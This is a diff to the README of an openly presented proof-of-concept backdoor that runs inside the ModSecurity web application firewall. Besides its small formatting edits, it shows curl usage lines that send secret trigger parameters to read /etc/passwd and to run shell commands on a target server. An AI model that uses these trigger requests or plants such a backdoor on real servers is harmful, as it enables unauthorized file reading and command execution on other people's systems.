@@ -2,7 +2,8 @@
 
 ## Description
 
-This is a proof-of-concept of malicious software running inside ModSecurity WAF.
+This is a proof-of-concept of malicious software running inside of ModSecurity
+WAF.
 
 Software has two main functions:
  * Retrieving content of files.
@@ -49,10 +50,10 @@ response.
 
 ### Usage examples
 
-Retrieving file content:
+Retrieving file content:  
 `curl -X POST -d "koomem6Shmog=/etc/passwd" "http://example.com/"`
 
-Running command and getting output:
+Running command and getting output:  
 `curl -X POST -d "tys4Olhuibves=/bin/ps aux" "http://example.com/"`
 
 ## License
